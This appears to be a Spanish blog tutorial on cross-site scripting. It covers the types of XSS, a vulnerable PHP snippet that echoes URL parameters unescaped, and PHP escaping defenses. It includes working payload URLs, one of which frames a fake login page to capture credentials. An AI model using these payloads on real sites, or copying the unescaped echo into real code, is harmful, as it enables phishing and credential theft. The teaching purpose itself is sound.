---
layout: post

title: XSS y sus consequencias 📚
subtitle: Injección de código en webs.

tags: [XSS, PHP, CSS, Seguridad, WEB]

thumbnail-img: /assets/img/lego-man.png
cover-img: /assets/img/spongebob-sick.gif
---

## **XSS**

### Tabla de Contenidos

1. [¿Qué es? :fire:](#qué-es)
2. [Tipos](#tipos)
3. [Consecuencias :eyes:](#consecuencias)
4. [Ejemplos](#ejemplos)
5. [¿Cómo evitarlos?](#cómo-evitarlos)
<br>

### ¿Qué es?

> Cross-site scripting (XSS) es una vulnerabilidad de seguridad que permite a un atacante inyectar código (por lo general Javascript) en un sitio web del lado del cliente.

Este tipo de vulnerabilidades son muy fáciles de detectar por parte de un atacante ya que en su mayoría son inyecciones directas del contenido de los parámetros de la url en la web. Por lo que si la entrada en crudo de los parametros se refleja en la salida de la web eso puede significar que existe un punto de entrada.

No hay realmente límite en lo que se puede realizar mediante XSS, ya que el atacante puede hacer cualquier manipulación de la experiencia del usuario.

Estos ataques se dividen en distintas categorías:

### Tipos

- **Almacenados**

  Cuando el ataque persiste en algún tipo de almacenamiento (cache, base datos, ...) y este se devuelve provocando la ejecución del código injectado.

- **Reflejados**

  Cuando el ataque se refleja desde la url al navegador del usuario, manipulando la experiencia de este en la web con XSS.

- **Basados en DOM**

  Cuando a través de un XSS Reflejado se modifican las acciones del navegador frente a los eventos de los elementos de la web afectada.


### Consecuencias

Existen muchas formas de obtener información de un usuario manipulando una web a través de XSS, algunos ejemplos:

- Acceso a microfono, cámara, geolocalización.
- Alterar formularios para obtener credenciales.
- Simular acciones del usuario.
- Reemplazar la web entera con un iframe falso.

![](/assets/img/spongebob-hide.gif)


### Ejemplos

```php
if (isset($_GET["categoria"])) $title_str = ucfirst(urldecode($_GET["categoria"]));
if (isset($_GET["lugar"])) $title_str .= " en ".ucfirst(urldecode($_GET["lugar"]));

echo '<title>'.$title_str.'</title>'.PHP_EOL;
```

<br>

- ```html
  http://*****************/?categoria=<svg/onload=alert('Hola')>"
  ```

  Mismo ejemplo, pero reemplazando toda la web por otra:

  - ```html
    https://*****************/?lugar=</title><script  src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script>jQuery('body').replaceWith('<iframe src="https://http.cat/"  style="border:0px;display:block;width:100vw;height:100vh"></iframe>')</script><title>
    ```

  ![](/assets/img/xss_gatos.png)

  Otro ejemplo, pero, esta vez el iframe apunta a un servidor con una réplica casi exacta del panel de login [`localhost:1234`]. La web cuenta con protección para no poder introducir iframes HTTP, pero no es muy difícil obtener un certificado SSL para una web:

  - ```html
    https://*****************/?lugar=</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script>jQuery('body').replaceWith('<iframe src="http://localhost:1234/index.html" style="border:0px;display:block;width:100vw;height:100vh"></iframe>')</script><title>
    ```

    Aunque no tiene SSL, es una dirección local, por lo que el navegador no se va a quejar en el ejemplo, para que un atacante pudiera hacer lo mismo requeriría de una web con SSL.
    
    La réplica del panel login está modificada para que el formulario pase los datos a través de una petición **GET**, por lo que todo lo que se envíe en el formulario, el atacante lo verá perfectamente en los parámetros de la llamada.
    
    

  Lo que vería la **víctima**:
  ![](/assets/img/xss_login.png)

  Lo que vería el **atacante**:
  ![](/assets/img/xss_terminal.png)


### ¿Cómo evitarlos?

En este caso el XSS era debido a que **no se estaba tratando de ninguna forma la entrada del usuario.**

- [htmlspecialchars()](https://www.php.net/manual/es/function.htmlspecialchars.php)

  Permite convertir todos los carácteres especiales a entidades HTML.

  **Muy importante conocer qué hace realmente esta función, ya que permite distintas entradas para filtrar según las necesidades.**

  

- [htmlentities()](https://www.php.net/manual/es/function.htmlentities)

  Esta función se asemeja a **htmlspecialchars()**, pero, convierte totalmente la entrada en entidades HTML.

  

  **HTML entities:** Son carácteres no interpretados como etiquetas HTML/ JS/ CSS, por lo que no permiten la inyección de código, pero se muestran como los carácteres que representan.

  

  INPUT:	`<script>alert('Hola')</script>`

  OUTPUT: `&lt;script&gt;alert(&#039;Hola&#039;)&lt;/script&gt;`

  

- **Librerías de terceros**

  - HTML Purifier

- **Frameworks**

  - Muchos frameworks cuentan con funciones para limpiar la entrada del usuario de forma segura.

- **Template Engines**

  - Twig
  - Ninja
  - Smarty

  Éstos cuentan con funciones de escape automático a la hora de imprimir el contenido de una variable al cliente.

  

Estas son algunas medidas recomendadas para evitar este tipo de ataques:

  - **Filtrar entrada**
  
    En el punto donde se recibe la entrada del usuario, filtra la entrada en función de lo que se espera o de la entrada válida.
    
    Es muy importante **nunca confiar** en que la entrada va a ser siempre la esperada.
    
    

  - **Codificar datos en la salida**
  
    Codificar la salida para evitar que se interprete como contenido activo.
    
    Si en algún punto existe XSS almacenado, por ejemplo en la base de datos, si la salida se muestra en crudo, puede afectar a todos los usuarios que puedan recibir esa entrada inyectada.
    
    **Por ejemplo**, si desde el lado del servidor no se limpia los campos de registro de un usuario, y estos mismos campos se renderizan en un listado de usuarios, el código inyectado podría ejecutarse en el navegador del usuario con permisos superiores.
    
    